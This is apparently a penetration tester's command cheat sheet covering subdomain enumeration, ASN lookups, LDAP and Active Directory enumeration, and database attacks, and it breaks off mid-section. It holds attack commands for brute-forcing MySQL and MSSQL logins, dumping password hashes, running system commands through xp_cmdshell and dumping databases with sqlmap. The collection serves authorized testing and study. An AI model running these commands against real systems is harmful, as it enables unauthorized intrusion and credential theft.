    curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
    curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .FDNS_A[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .RDNS[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://tls.bufferover.run/dns?q=.$1" | jq -r .Results 2>/dev/null | cut -d ',' -f3 | grep -o "\w.*$1"| sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$Domain" |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
    curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u >> tmp.txt &
    curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep -oaEi "https?://[^\"\\'> ]+" | grep $1 | sed 's/https\?:\/\///' | cut -d "/" -f3 | sort -u >> tmp.txt &
    curl -s "https://riddler.io/search/exportcsv?q=pld:$1" | grep -o "\w.*$1" | cut -d ',' -f6 | sort -u >> tmp.txt &
    curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$1" | jq '.subdomains' | cut -d '"' -f2 | cut -d '[' -f1 | cut -d ']' -f1 | grep . | sort -u >> tmp.txt &
    curl -s "https://api.threatminer.org/v2/domain.php?q=$1&rt=5" | jq -r '.results[]' | sort -u >> tmp.txt &
    curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u >> tmp.txt &



##-==================================================-##
##   [+] OSINT - DNSDumpster API - Enum Scanner: 
##-==================================================-##
csrftoken=$(curl -ILs https://dnsdumpster.com | grep csrftoken | cut -d " " -f2 | cut -d "=" -f2 | tr -d ";")
curl -s --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$csrftoken&targetip=$1" --cookie "csrftoken=$csrftoken; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com >> dnsdumpster.html

if [[ -e $1 && -s $1 ]]; then # file exists and is not zero size
    cat dnsdumpster.html | grep "https://api.hackertarget.com/httpheaders" | grep -o "\w.*$1" | cut -d "/" -f7 | grep '.' | sort -u >> tmp.txt
fi




##-==================================================-##
##   [+] OSINT - URLScan.io API - Domain Scanner 
##-==================================================-##
curl -s "https://urlscan.io/api/v1/search/?q=domain:$1" | jq -r '.results[].page.domain' | sort -u >> tmp.txt &

curl --insecure -L -s "https://urlscan.io/api/v1/search/?q=domain:$Domain" 2> /dev/null | egrep "country|server|domain|ip|asn|$Domain|prt"| sort -u | tee $DIR/urlscanio-$Domain.txt




##-======================================================-##
##   [+] OSINT - Sonar Database API - SubDomain Scanner 
##-======================================================-##
curl https://sonar.omnisint.io/subdomains/$Domain | jq -r ".[]"



##-=============================================-##
##   [+] OSINT - jldc API - SubDomain Scanner 
##-=============================================-##
curl https://jldc.me/anubis/subdomains/$Domain | jq -r ".[]"





https://whois.arin.net
http://viewdns.info/
https://hunter.io/
https://www.zoomeye.org/
https://greynoise.io/
https://shodan.io/
https://censys.io/





SubDomainizer.py -u $Domain | grep $Domain




subscraper.py -u $Domain | grep $Domain | cut -d " " -f



##-=============================================-##
##   [+] shuffledns - 
##-=============================================-##
shuffledns -d $Domain -list $File.txt -r resolvers.txt



##-=============================================-##
##   [+] puredns - 
##-=============================================-##
puredns bruteforce all.txt $Domain




puredns bruteforce $Dir/$File.txt $Domain -r $Dir/$file.txt -w $Dir/$File.txt --skip-wildcard-filter --skip-validation



puredns resolve $Dir/$File.txt $Domain -r $Dir/$file.txt -w $Dir/$File.txt --skip-wildcard-filter --skip-validation




##-=============================================-##
##   [+] aiodnsbrute - 
##-=============================================-##
aiodnsbrute -r resolvers -w $Wordlist.txt -vv -t 1024 $Domain




cat $SubDomains.txt | dnsgen - 




goaltdns -l $SubDomains.txt -w /$Dir/$File.tx -o /$Dir/final-words-s3.txt





gotator -sub $SubDomains.txt -silent -perm /$Dir/$File.txt


gotator -sub $SubDomains.txt -perm /$Dir/$File.txt -depth 1 -numbers 10 -mindup -adv -md | sort -u > perms.txt

puredns resolve permutations.txt -r resolvers.txt > resolved_perms


gotator -sub not_vali_subs.txt -perm dns_permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md | sort -u > perms.txt


##-================================================-##
##   [+] Gotator - DNS Permutations
##-================================================-##
gotator -sub $Dir/dns_bf_resolved.txt -perm $Dir/dns_permutations_list.txt -mindup -fast -silent | sort -u > $Dir/$Permutations.txt



dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o resolvers.txt




puredns bruteforce $DNSWordlist.txt $Domain -r resolvers.txt -w $OutFile.txt



altdns -i  -w /$Dir/$File.txt -o /$Dir/asd3





echo www | subzuf $Domain






domain-profiler
domain_analyzer
VHostScan


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Shodan - Recon + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nmap --script shodan-api.nse




##-======================================-##
##    [+] NMap - Shodan API NSE Script:
##-======================================-##
nmap -sn -Pn -n --script=shodan-api -script-args ‘shodan-api.apikey=$APIKey’ $Domain



##-================================================-##
##   [+] NMap NSE - Netblock OSINT - ASN Scanner:
##-================================================-##
## --------------------------------------------------------------- ##
##   [?] Find netblocks that belong to an ASN using targets-asn
## --------------------------------------------------------------- ##
nmap --script targets-asn --script-args targets-asn.asn=$ASN




##-===================================================================-##
##   [+] NMap - NSE Scans - ASN Query + IP Geolocation Information:
##-===================================================================-##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24


##-==================================================-##
##   [+] IP-API - Find ASN for a given IP address
##-==================================================-##
curl -s http://ip-api.com/json/$IP | jq -r .as



##-=======================================================================-##
##   [+] ss - Lookup Autonomous Systems of All Outgoing http/s Traffic:
##-=======================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


##-=========================================-##
##   [+] ASNMap - Gather CIDRs from ASN:
##-=========================================-##
asnmap -silent -r resolvers.txt -a asn | tee -a asnmap_cidr_results.txt


##-====================================================-##
##   [+] ASNMap - Gather CIDRs from organization ID:
##-====================================================-##
asnmap -silent -r resolvers.txt -org id | tee -a asnmap_cidr_results.txt



##-===============================-##
##   [+] Gather ASNs from IPs:
##-===============================-##
for ip in $(cat ips.txt); do res=$(whois -h whois.cymru.com "${ip}" | grep -Poi '^\d+'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_asns.txt

grep -Po '(?<=\|\ )(?(?!\ \|).)+' ips_to_asns.txt | sort -uf | tee -a asns.txt



##-===============================-##
##   [+] Gather CIDRs from ASNs:
##-===============================-##
for asn in $(cat asns.txt); do res=$(whois -h whois.radb.net -i origin "AS${asn}" | grep -Poi '(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}\/[0-9]+'); if [[ ! -z $res ]]; then echo "AS${asn} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a asns_to_cidrs.txt

grep -Po '(?<=\|\ )(?(?!\ \|).)+' asns_to_cidrs.txt | sort -uf | tee -a cidrs.txt



##-=====================================================-##
##   [+] Regex - Gather Organization Names from IPs:
##-=====================================================-##
for ip in $(cat ips.txt); do res=$(whois -h whois.arin.net "${ip}" | grep -Po '(?<=OrgName\:)[\s]+\K.+'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_organization_names.txt

grep -Po '(?<=\|\ )(?(?!\ \|).)+' ips_to_organization_names.txt | sort -uf | tee -a organization_names.txt


##-=========================================-##
##   [+] Regex - Gather IPs (A Records):
##-=========================================-##
for subdomain in $(cat subdomains.txt); do res=$(host -t A "${subdomain}" | grep -Po '(?<=has\ address\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${subdomain} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a subdomains_to_ips.txt

grep -Po '(?<=\|\ )[^\s]+' subdomains_to_ips.txt | sort -uf | tee -a ips.txt


## ----------------------------------------------------------- ##
##    [?] Check if domains/subdomains are alive with httpx. 
##    [?] Check if IPs are alive or not with Nmap.
## ----------------------------------------------------------- ##

##-=====================================================-##
##   [+] Regex - Gather Virtual Hosts (PTR Records):
##-=====================================================-##
for ip in $(cat ips.txt); do res=$(host -t PTR "${ip}" | grep -Po '(?<=domain\ name\ pointer\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_subdomains.txt

grep -Po '(?<=\|\ )[^\s]+' ips_to_subdomains.txt | sort -uf | tee -a subdomains.txt


##-=========================================================-##
##   [+] Regex - Gather Canonical Names (CNAME Records):
##-=========================================================-##
for subdomain in $(cat subdomains.txt); do res=$(host -t CNAMES "${subdomain}" | grep -Po '(?<=is\ an\ alias\ for\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${subdomain} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a subdomains_to_cnames.txt

grep -Po '(?<=\|\ )[^\s]+' subdomains_to_cnames.txt | sort -uf | tee -a cnames.txt








##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] LDAP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



    dpkg-reconfigure -plow slapd
## --------------------------------------------------------------- ##
##  Omit OpenLDAP server configuration? No
##  DNS Domain Name: frozza.com
##  Organizaion name: Frozza
##  Administrator password: qwe123
## --------------------------------------------------------------- ##
##  DB backend: HDB
##  Remove when slapd is purged: No
##  Allow v2 protocol: No
## --------------------------------------------------------------- ##


    ps -ef | grep slapd
## --------------------------------------------------------------- ##
##   slapdopenldap  3320     1  0 22:29 ?        00:00:00 /usr/sbin/slapd -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d
## --------------------------------------------------------------- ##





nmap --script ldap-search.nse $IP
nmap --script ldap-rootdse.nse $IP
nmap --script ldap-novell-getpass.nse $IP
nmap --script ldap-brute.nse $IP



##-==================================================-##
##   [+] LDAP - 
##-==================================================-##
ldapsearch -x -h $IP -b "dc=domain,dc=tld"


## ----------------------------------------------------------- ##
##   [?] LDAP/Active Directory - Search for anonymous bind
## ----------------------------------------------------------- ##
ldapsearch -x -b "dc=megabank,dc=local" "\*" -h  $IP




## ------------------------------------------------- ##
##   [?] LDAP/Active Directory - Anonymous Bind:
## ------------------------------------------------- ##
ldapsearch -h $Hostname -p 389 -x -b "dc=domain,dc=com"


## ------------------------------------------------- ##
##   [?] LDAP/Active Directory - Authenticated:
## ------------------------------------------------- ##
ldapsearch -h $IP -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W


## --------------------------------------------------------- ##
##   [?] LDAP/Active Directory - Look for Anonymous Bind:
## --------------------------------------------------------- ##
ldapsearch -x -b "dc=megabank,dc=local" "*" -h $IP


##-===================-##
##   [+] LDAPSearch - 
##-===================-##
ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName



##-==========================================================-##
##   [+] list all computers that were added by non-admins:
##-==========================================================-##
Import-Module ActiveDirectory
Get-ADComputer -LDAPFilter "(ms-DS-CreatorSID=*)" -Properties ms-DS-CreatorSID


##-===================================================================-##
##   [+] LDAP - collect the information from the domain controller:
##-===================================================================-##
python ldapdomaindump.py -u $Domain\$User -p $Pass -d <DELIMITER> $DCIP

python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1





/var/lib/ldap               ## DB directory - Contains DITs

cn=config (default)         ## root config of LDAP instance server wide.




##-==================================================-##
##   [+] LDAP - Dump (all) Default Configuration:
##-==================================================-##
ldapsearch -Y EXTERNAL -H ldapi:/// -b "cn=config"



##-===============================-##
##   [+] LDAP - 
##-===============================-##
ldapsearch -h $IP -p 389 -x -s base


##-===============================-##
##   [+] LDAP - Anonymous Bind:
##-===============================-##
ldapsearch -h $Hostname -p 389 -x -b "dc=domain,dc=com"


##-===============================-##
##   [+] LDAP - Authenticated:
##-===============================-##
ldapsearch -h $IP -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W



slapcat -v -l backup_ldap.ldif


ps -ef | grep slapd


##-========================================-##
##   [+] WinDAPSearch  - 
##-========================================-##
windapsearch.py -d host.domain.tld -u domain\\ldapbind -p $Password -U


##-==================================================-##
##   [+] Obtain domain information using windows:
##-==================================================-##
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName


net group "Domain Controllers" /domain
net group "Domain Admins" /domain
net users /domain
net accounts


##-==================================-##
##   [+] DNS Lookup - LDAP Records
##-==================================-##
nslookup -type=SRV _ldap._tcp.

nslookup -type=SRV _ldap._tcp.dc_msdcs.//DOMAIN/



##-========================================-##
##   [+] CrackMapExec - Find ADCS Server
##-========================================-##
crackmapexec ldap domain.lab -u $User -p $Pass -M adcs


##-===================================================-##
##   [+] Enumerate AD Enterprise CAs with certutil: 
##-===================================================-##
certutil.exe -config --ping
certutil.exe -dump


##-===============================================================-##
##   [?] Remove parameters, some LDAP servers authorise NULL
##-===============================================================-##
http://192.168.32.128/ldap/example1.php?%00






##-===============================================================-##
##   [+] bloodhound - LDAP Active Directory - Lateral Movement
##-===============================================================-##
## --------------------------------------------------------------- ##
##   [?] invoke-bloodhound from sharphound.ps1 
## --------------------------------------------------------------- ##
import-module .\sharphound.ps1
invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] iSCSI - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nmap --script iscsi-info.nse $IP


iscsi-brute


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SQL - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "mysql" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=3306 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "postgres" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=5432 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;


nmap --script=pgsql* -p 5432 $TARGET
nmap --script=mysql* -p 3306 $TARGET



nmap --script=broadcast-ms-sql-discover.nse $IP
nmap --script ms-sql-info.nse $IP
nmap --script mysql-info.nse $IP
nmap --script ms-sql-ntlm-info.nse $IP
nmap --script mysql-enum.nse $IP
nmap --script mysql-users.nse $IP
nmap --script=ms-sql-tables.nse $IP
nmap --script=ms-sql-config.nse $IP
nmap --script=ms-sql-query.nse $IP
nmap --script mysql-query.nse $IP
nmap --script=ms-sql-dump-hashes.nse $IP
nmap --script mysql-dump-hashes.nse $IP
nmap --script=ms-sql-empty-password.nse $IP
nmap --script mysql-empty-password.nse $IP
nmap --script=ms-sql-hasdbaccess.nse $IP
nmap --script=mysql-variables.nse $IP
nmap --script=ms-sql-xp-cmdshell.nse $IP
nmap --script=ms-sql-brute.nse $IP
nmap --script mysql-vuln-cve2012-2122.nse $IP



##-==================================================-##
##   [+] NMap - ms-SQL All NSE Scans - Show Vulns
##-==================================================-##
nmap --script ms-sql-* --script-args vulns.showall $IP -oN nmap_mssql_$IP.txt


##-=============================================-##
##   [+] Metasploit - MySQL Auxiliary Scanner
##-=============================================-##
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU -Pn -n -T4 --open -p1434 <targetRange>


##-=============================================-##
##   [+] NMap - MySQL - Enumeration + Brute
##-=============================================-##
nmap -p1433 --script ms-sql-info $IP
nmap -p1433 --script ms-sql-brute --script-args mssql.instance-all,userdb=$userlist.txt,passdb=$wordlist.txt $IP


##-=========================================-##
##   [+] Metasploit - MySQL Enumeration:
##-=========================================-##
msf > use auxiliary/scanner/mssql/mssql_login
msf > use auxiliary/admin/mssql/mssql_enum
msf > use auxiliary/scanner/mssql/mssql_hashdump
msf > use auxiliary/admin/mssql/mssql_escalate_dbowner


##-================================================-##
##   [+] Metasploit - MySQL - Post Exploitation
##-================================================-##
msf > use auxiliary/admin/mssql/mssql_exec



##-=======================================-##
##   [+] Nmap - Ms-SQL Every NSE Script
##-=======================================-##
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP -p 3306


##-=======================================-##
##   [+] NMap - MS SQL Server security:
##-=======================================-##
nmap -sV -v --open -p U:T:1433,1434,1434,2383,2382,135,4022,T:1433,1434,1434,2383,2382,135,4022 -iL ipx


##-===================================================-##
##   [+] NMap - Check sa account with null password
##-===================================================-##
nmap -p 1433 –script ms-sql-empty-password $IP
nmap -p 445 –script ms-sql-empty-password –script-args mssql.instance-all $IP


##-====================================-##
##   [+] NMap - Brute Force attacks
##-====================================-##
nmap -p1433 –script ms-sql-brute $IP


##-================================================================-##
##   [+] NMap - Dumping the password hashes of an MS SQL server
##-================================================================-##
nmap -p1433 –script ms-sql-empty-password,ms-sql-dump-hashes $IP


##-====================================-##
##   [+] NMap - Getting Information
##-====================================-##
nmap -p1433-1900 –script ms-sql-info $IP


##-=======================================================-##
##   [+] NMap - Running command shell on MS SQL servers
##-=======================================================-##
nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=”,ms-sql-xp-cmdshell.cmd=”dir” 192.200.11.11
nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=$User,mssql.password=$Pass,ms-sql-xp-cmdshell.cmd=”dir” 192.200.11.11


##-===================================================================-##
##   [+] NMap - Runs a query against Microsoft SQL Server (ms-sql)
##-===================================================================-##
nmap -p 1433 –script ms-sql-query –script-args mssql.username=sa,mssql.password=”,ms-sql-query.query=”SELECT * FROM syslogins” 192.200.11.11
nmap -p 1433 –script ms-sql-query –script-args mssql.username=$User,mssql.password=$Pass,ms-sql-query.query=”SELECT * FROM syslogins” 192.200.11.11




##-===========================================-##
##   [+] NMap - Extracting Data From MSSQL:
##-===========================================-##

nmap -sV -p 1433 --script ms-sql-tables --script-args mssql.username=$User,mssql.password=$Pass\!23 $IP

nmap -p1433 --script ms-sql-hasdbaccess.nse --script-args mssql.username=$User,mssql.password=$Pass\!23 $IP

nmap -p1433 --script ms-sql-tables --script-args mssql.username=$User,mssql.password=$Pass\!23 $IP

nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=$User,mssql.password=$Pass\!23 $IP

nmap -p1433 --script ms-sql-xp-cmdshell --script-args=ms-sql-xp-cmdshell.cmd='net users',mssql.username=$User,mssql.password=$Pass\!23 $IP

nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=$User,mssql.password=$Pass\!23 $IP





## --------------------------------------------------------------------------- ##
##   mysqld --initialize            ## Initalize the MySQL Data Directory
##                                  ## > Create System Tables
##                                  ## > Setup MySQL Admin Account
## --------------------------------------------------------------------------- ##
##   mysql_secure_installation      ## 
## --------------------------------------------------------------------------- ##



## -------------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p                            ## Login to MySQL as Root and prompt for password
## -------------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p$Password                   ## Login to MySQL as Root with the specified password
## -------------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p -h $Host -P $Port          ## Login to Remote MySQL Host and Port 
## -------------------------------------------------------------------------------------------------------- ##


## -------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p -eNB'SHOW DATABASE'                   ## Run an SQL command via MySQL
## -------------------------------------------------------------------------------------------------- ##

## -------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p  --all-databases > $Dump.sql          ## Backup all Databases to dump file
## -------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p db > $Dump.sql                        ## Backup A Database to Dump File
## -------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p --databases $DB1 $DB2 > $Dump.sql     ## Backup Multiple DBs to Dump File
## -------------------------------------------------------------------------------------------------- ##
##   mysql -u root -p db $Table1 $Table2 > $Dump.sql        ## Backup Tables of DB to a Dump File
## -------------------------------------------------------------------------------------------------- ##


## --------------------------------------------------------------------------------------------- ##
##   mysql -u root -p < $Dump.sql           ## Restore All Databases from a Dump FIle
## --------------------------------------------------------------------------------------------- ##
##   mysql -u root -p db < $Dump.sql        ## Restore a Specific Database from Dump File  
## --------------------------------------------------------------------------------------------- ##
##   


## --------------------------------------------------------------- ##
##   mysql_upgrade -u root -p
## --------------------------------------------------------------- ##



## --------------------------------------------------------------- ##
##   mysqlcheck --check              ## Check Table for errors
## --------------------------------------------------------------- ##
##   mysqlcheck --analyze            ## Analyze Table
## --------------------------------------------------------------- ##
##   mysqlcheck --optimize           ## Optimize Table
## --------------------------------------------------------------- ##
##   mysqlcheck --repair             ## Repair Table
## --------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------------------- ##
##   mysqlcheck --check db $Table                    ## Check Specified Table of the specified MySQL Database
## ---------------------------------------------------------------------------------------------------------------- ##
##   mysqlcheck --check --databases $db1 $db2        ## Check Specified MySQL Databases
## ---------------------------------------------------------------------------------------------------------------- ##
##   mysqlcheck --check --all-databases              ## Check All MySQL Databases
## ---------------------------------------------------------------------------------------------------------------- ##


mysqlcheck --check 


## --------------------------------------------------------------- ##
##   mysqlslap           ## MySQL Stress Testing
## --------------------------------------------------------------- ##
##   mysqltuner.pl       ## Review MySQL install configuration
## --------------------------------------------------------------- ##
##   mysqlreport         ## MySQL status values
## --------------------------------------------------------------- ##


## --------------------------------------------------------------- ##
##   mytcp               ## Monitor MySQL Processes and Queries
## --------------------------------------------------------------- ##
##   innotop             ## Monitor MySQL InnoDB Transactions
## --------------------------------------------------------------- ##



dbs="$(mysql -uroot -ppassword -Bse'SHOW DATABASES;')"
for db in $dbs
do
    [Operation on $db]
done






##-================================================-##
##   [+] MySQLDump - Backup All MySQL Databases:
##-================================================-##
mysqldump -u $User -p $Pass --all-databases --single-transaction


##-=======================================================-##
##   [+] MySQLClient - Connect to Windows ms-SQL Server
##-=======================================================-##
mssqlclient.py -windows-auth $User@$IP
mssql-cli -S $IP -U $User


mssqlclient.py -port 27900 $User:$Pass@$IP
sqsh -S $IP -U $User -P $Pass


##-===============================================-##
##    [+] PSQL - search subdomain using cert.sh
##-===============================================-##
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew'




## ----------------------------------------------------------------------------------------------------------------------------------------- ##
alias watchmysql="watch -n 1 mysqladmin --user=$1 --password=$2 processlist"
## ----------------------------------------------------------------------------------------------------------------------------------------- ##
##  [?] Get table column names from an MySQL-database in comma-seperated form
alias mysqltablenames="mysql -u$User -p$Pass -s -e 'DESCRIBE <table>' $Database"
## alias mysqltablenames="mysql -u$User -p$Pass -s -e 'DESCRIBE <table>' $Database  | tail -n +1 | awk '{ printf($1",")}' |  head -c -1"
## ----------------------------------------------------------------------------------------------------------------------------------------- ##
##  [+] MySQLDump - Dump All Databases Remotely Using SSH:
alias mysqldumpssh="mysqldump -u user -p --all-databases | ssh user@host dd of=/opt/all-databases.dump"
## ----------------------------------------------------------------------------------------------------------------------------------------- ##





##-=========================================-##
##   [+] THC-Hydra - Brute Force - MySQL
##-=========================================-##
hydra -l sa -P ../creds/pass.txt $IP -s target-port mssql

hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql
hydra -v -l root -P $PassFile.lst -t 1 mysql://$IP -o brute_mysql.out
hydra -v -l sa -P $PassFile.lst -t 4 $IP mssql -o brute_mssql.out
hydra -t 5 -V -f -l sa -P "C:\$PassFile.txt" 1.2.144.244 mssql
hydra mssql://$IP:1433 -l sa -P /root/Desktop/$PassFile





## ---------------------------------------------------------- ##
##   [?] Patator - mssql_login Module - Brute-force MSSQL
## ---------------------------------------------------------- ##
## 
## ---------------------------------------------------------- ##
##   [?] Patator - mysql_login Module - Brute-force MySQL
## ---------------------------------------------------------- ##
## 
## ----------------------------------------------------------------- ##
##   [?] Patator - mysql_query Module - Brute-force MySQL queries
## ----------------------------------------------------------------- ##
## 
## ----------------------------------------------------------------- ##
##   [?] Patator - pgsql_login  Module - Brute-force PostgreSQL
## ----------------------------------------------------------------- ##



patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,retry:code=500

patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,retry:code=500






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SQLMap - SQL Database - SQL Injection Attacks
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ---------------------------------------------------------------- ##
##   [?] SQLMapAPI - Automatic SQL Injection Tool - API Server:
## ---------------------------------------------------------------- ##


## --------------------------------------------------------------------------------------- ##
     sqlmapapi --server         ## Run as a REST-JSON API server
     sqlmapapi --client         ## Run as a REST-JSON API client
## --------------------------------------------------------------------------------------- ##
     sqlmapapi --host=$HOST      ## Host of the REST-JSON API server (default "127.0.0.1")
     sqlmapapi --port=$PORT      ## Port of the the REST-JSON API server (default 8775)
## --------------------------------------------------------------------------------------- ##
     sqlmapapi --server --host=127.0.0.1 --port=8775

## --------------------------------------------------------------------------------------- ##
     sqlmapapi --adapter=$ADAPTER        ## Server (bottle) adapter to use (default "wsgiref")
## --------------------------------------------------------------------------------------- ##
     sqlmapapi --username=$USER          ## Basic authentication username (optional)
     sqlmapapi --password=$PASS          ## Basic authentication password (optional)
## --------------------------------------------------------------------------------------- ##


## --------------------------------------------------------------------------------------- ##
     sqlmapapi --server --host=127.0.0.1 --port=8775 --username=$USER --password=$PASS 
## --------------------------------------------------------------------------------------- ##




##-============================-##
##   [+] SQLMap - Easy mode:
##-============================-##
sqlmap --wizard


##-===================================================================-##
##    [+] SQLMap - Capture request with burp & save to request.txt:
##-===================================================================-##
## -------------------------------------------------------------------------------- ##
##    [?]  you need to authenticate before you can access vulnerable parameter.
## -------------------------------------------------------------------------------- ##
sqlmap -r request.txt


##-===================================================-##
##   [+] SQLMap - grab cookie out of burp/proxy
##                insert into command line option:
##-===================================================-##
sqlmap -u "http://$IP/index.php?id=1" --cookie "PHPSESSIONID=1234example"


##-=======================-##
##   [+] SQLMap - Dump
##-=======================-##
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql -D databasename -T tablename --dump


##-=======================-##
##   [+] SQLMap - Crawl
##-=======================-##
sqlmap -u http://$IP --dbms=mysql --crawl=3


##-================================-##
##   [+] SQLMap - List databases
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 --dbs


##-=============================-##
##   [+] SQLMap - List tables
##-=============================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name --tables


##-==============================-##
##   [+] SQLMap - List columns
##-==============================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name -T table_name --columns


##-===========================-##
##   [+] SQLMap - Dump all
##-===========================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name -T table_name --dump-all


##-=============================-##
##   [+] SQLMap - Set Cookie
##-=============================-##
